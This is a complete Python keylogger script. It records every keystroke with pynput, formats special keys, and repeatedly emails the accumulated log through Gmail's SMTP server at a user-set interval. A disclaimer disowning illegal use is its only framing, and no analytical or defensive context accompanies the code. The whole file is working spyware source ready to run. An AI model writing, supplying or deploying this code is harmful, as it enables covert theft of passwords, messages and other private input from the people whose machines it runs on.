from pynput.keyboard import Listener
from threading import Timer
from datetime import datetime
import smtplib

EMAIL_ADDRESS = input("Email Address:")
EMAIL_PASSWD = input("Email password:")
TIME = float(input("Average sending mail time: "))

now = datetime.now()

disclaimer = """Do not attempt to violate the law. 
If you planned to use the content for illegal purpose, 
i'm not be responsible of your actions."""

msg = """ From: Keylogger Script
To: """ + EMAIL_ADDRESS + """
Subject: Keylogger Log Mail Content

""" + str(disclaimer).upper() + """

[ -- ] STARTING TIME: """ + str(now) + """

""" 

def on_press(key):
    global msg
    keystroke = str(key).replace("'", "")
    
    if keystroke == 'Key.enter': msg += " [ ENTER ] \n"
    elif keystroke == 'Key.backspace': msg = msg[:-1] 
    elif keystroke == 'Key.space': msg += ' '
    elif keystroke == 'Key.caps_lock': msg += ''
    elif "Key" in keystroke: msg += " [ "+ str(key).replace("Key.", "").upper() +" ] "
    else: msg += keystroke

def send():
    global msg
    if len(msg)>0: server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
    Timer(TIME, send).start()
 
listener = Listener(on_press=on_press)
listener.start()
 
server=smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(EMAIL_ADDRESS, EMAIL_PASSWD)
 
Timer(0.0, send).start()